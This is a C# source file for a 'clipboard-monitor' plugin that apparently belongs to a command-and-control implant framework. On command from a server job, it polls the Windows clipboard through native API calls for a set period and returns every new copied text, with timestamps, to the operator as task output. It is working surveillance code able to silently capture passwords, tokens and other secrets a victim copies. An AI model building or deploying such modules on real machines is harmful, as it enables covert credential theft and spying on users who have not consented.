using System.Runtime.InteropServices;
using System.Text.Json;
using Workflow.Contracts;
using Workflow.Models;
using Workflow.Utilities;

namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "clipboard-monitor";
        private IDataBroker messageManager { get; set; }

        public Plugin(PluginContext context)
        {
            this.messageManager = context.MessageManager;
        }

        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            try
            {
                if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                {
                    messageManager.Write(
                        "Clipboard monitoring is only available on Windows",
                        job.task.id, true, "error");
                    return;
                }

                var args = JsonSerializer.Deserialize<clipboard_monitor.ClipboardMonitorArgs>(
                    job.task.parameters) ?? new clipboard_monitor.ClipboardMonitorArgs();

                int durationMs = args.duration * 1000;
                int intervalMs = args.interval * 1000;
                string lastContent = "";
                var entries = new List<Dictionary<string, string>>();
                var sw = System.Diagnostics.Stopwatch.StartNew();

                while (sw.ElapsedMilliseconds < durationMs)
                {
                    try
                    {
                        string current = GetClipboardText();
                        if (!string.IsNullOrEmpty(current) && current != lastContent)
                        {
                            entries.Add(new Dictionary<string, string>
                            {
                                ["timestamp"] = DateTime.UtcNow.ToString("o"),
                                ["content"] = current
                            });
                            lastContent = current;

                            messageManager.Write(
                                $"[{DateTime.UtcNow:HH:mm:ss}] New clipboard: {current}",
                                job.task.id, false);
                        }
                    }
                    catch { }

                    await Task.Delay(intervalMs);
                }

                string summary = entries.Count > 0
                    ? JsonSerializer.Serialize(entries,
                        new JsonSerializerOptions { WriteIndented = true })
                    : "No clipboard changes detected";

                messageManager.AddTaskResponse(new TaskResponse
                {
                    completed = true,
                    user_output = summary,
                    task_id = job.task.id
                });
            }
            catch (Exception e)
            {
                DebugLog.Log($"{Name} error: {e.Message} [{job.task.id}]");
                messageManager.Write(e.ToString(), job.task.id, true, "error");
            }
        }

        private static string GetClipboardText()
        {
            if (!OpenClipboard(IntPtr.Zero))
                return "";

            try
            {
                IntPtr handle = GetClipboardData(13); // CF_UNICODETEXT
                if (handle == IntPtr.Zero)
                    return "";

                IntPtr ptr = GlobalLock(handle);
                if (ptr == IntPtr.Zero)
                    return "";

                try
                {
                    return Marshal.PtrToStringUni(ptr) ?? "";
                }
                finally
                {
                    GlobalUnlock(handle);
                }
            }
            finally
            {
                CloseClipboard();
            }
        }

        [DllImport("user32.dll")]
        private static extern bool OpenClipboard(IntPtr hWndNewOwner);

        [DllImport("user32.dll")]
        private static extern bool CloseClipboard();

        [DllImport("user32.dll")]
        private static extern IntPtr GetClipboardData(uint uFormat);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GlobalLock(IntPtr hMem);

        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool GlobalUnlock(IntPtr hMem);
    }
}
